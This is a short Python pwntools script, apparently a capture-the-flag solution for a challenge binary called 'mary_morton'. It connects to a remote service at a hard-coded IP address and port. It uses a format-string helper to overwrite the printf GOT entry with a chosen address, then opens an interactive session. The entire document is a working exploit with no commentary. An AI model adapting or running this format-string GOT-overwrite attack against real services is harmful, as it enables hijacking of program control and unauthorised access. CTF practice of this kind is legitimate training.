from pwn import *
from formatStringExploiter.FormatString import FormatString

#p=process('mary_morton')
p=remote("111.198.29.45",44435)
elf=ELF('mary_morton')
libc=ELF('libc-2.23.so')
context.clear(arch = 'amd64')
taraddr=0x4008da
print_addr=elf.got['printf']
print "printf_addr:"+hex(print_addr)
print p.recv()


def exec_fmt(s):
    p.sendline('2')
    sleep(0.1)
    p.sendline(s)
    ret = p.recvuntil('1. ',drop=True)
    return ret

#print fmt('aaaa')


fmt=FormatString(exec_fmt,elf=elf,index=6)
fmt.write_qword(print_addr,taraddr)
print p.recv()
p.sendline('1')



p.interactive()

#print offset

